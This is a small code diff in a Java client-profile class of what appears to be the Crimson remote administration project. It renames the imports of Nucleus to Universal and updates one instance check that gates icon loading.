@@ -41,12 +41,12 @@ import com.subterranean_security.crimson.core.proto.Delta.AttributeGroupContaine
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
 import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
 import com.subterranean_security.crimson.core.util.Validation;
-import com.subterranean_security.crimson.nucleus.Nucleus;
-import com.subterranean_security.crimson.nucleus.Nucleus.Instance;
 import com.subterranean_security.crimson.core.proto.Keylogger.State;
 import com.subterranean_security.crimson.sv.keylogger.Log;
 import com.subterranean_security.crimson.sv.profile.attribute.Attribute;
 import com.subterranean_security.crimson.sv.profile.attribute.UntrackedAttribute;
+import com.subterranean_security.crimson.universal.Universal;
+import com.subterranean_security.crimson.universal.Universal.Instance;
 import com.subterranean_security.crimson.viewer.ui.UIUtil;
 
 /**
@@ -171,7 +171,7 @@ public class ClientProfile implements Serializable {
 	public ClientProfile initialize() {
 		if (!initialized) {
 			// load icons
-			if (Common.instance == Nucleus.Instance.VIEWER) {
+			if (Common.instance == Universal.Instance.VIEWER) {
 				loadIcons();
 			}
 
